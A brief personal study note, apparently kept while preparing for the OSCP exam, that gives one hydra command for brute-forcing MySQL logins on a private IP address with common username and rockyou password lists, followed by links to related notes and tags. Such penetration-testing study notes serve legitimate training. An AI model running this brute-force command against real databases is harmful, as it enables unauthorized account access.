# hydra brute force MYSQL
Change MYDATABASENAME. Default databasename is mysql.
```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15
```

` zet/20221003150740/README.md `

# Related

- [20221012153512](/zet/20221012153512/README.md) database
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221003150744](/zet/20221003150744/README.md) hydra brute force
- ~/kb/hacking/commands/hydra.md

Tags:

    #command #hacking #hydra 
